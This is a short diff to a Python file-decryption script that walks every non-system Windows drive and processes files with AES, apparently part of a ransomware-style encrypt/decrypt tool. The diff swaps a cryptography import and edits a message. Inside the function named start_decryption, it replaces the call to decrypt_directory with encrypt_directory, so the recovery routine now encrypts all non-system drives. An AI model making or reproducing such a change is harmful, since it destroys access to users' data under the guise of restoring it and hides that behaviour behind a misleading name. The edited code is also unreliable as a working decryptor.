@@ -8,7 +8,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 import winshell
 from colorama import Fore, init
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from Crypto.Cipher import AES
 
 init(autoreset=True)
 
@@ -67,10 +67,8 @@ def start_decryption():
         for i, letter in enumerate(string.ascii_uppercase)
         if bitmask & (1 << i)
     ]:
-        if not os.path.samefile(
-            disk, os.getenv("SystemDrive") + "/"
-        ) and not os.path.samefile(disk, os.getenv("HOMEDRIVE") + "/"):
-            decrypt_directory(disk, key)
+        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
+            encrypt_directory(disk, key)
 
 
 def decrypt_file(path, key, chunk_size=268435456):
@@ -99,7 +97,7 @@ def decrypt_file(path, key, chunk_size=268435456):
                     decrypted_chunk = cipher.decrypt_and_verify(encrypted_chunk, tag)
                     f_out.write(decrypted_chunk)
                 except ValueError:
-                    print(f"{Fore.LIGHTRED_EX}Authentication failed for {path} - File may be tampered")
+                    print(f"{Fore.LIGHTRED_EX}Authentication failed for {path} - File may be tampered!")
                     return
         os.remove(path)
     except Exception as e:
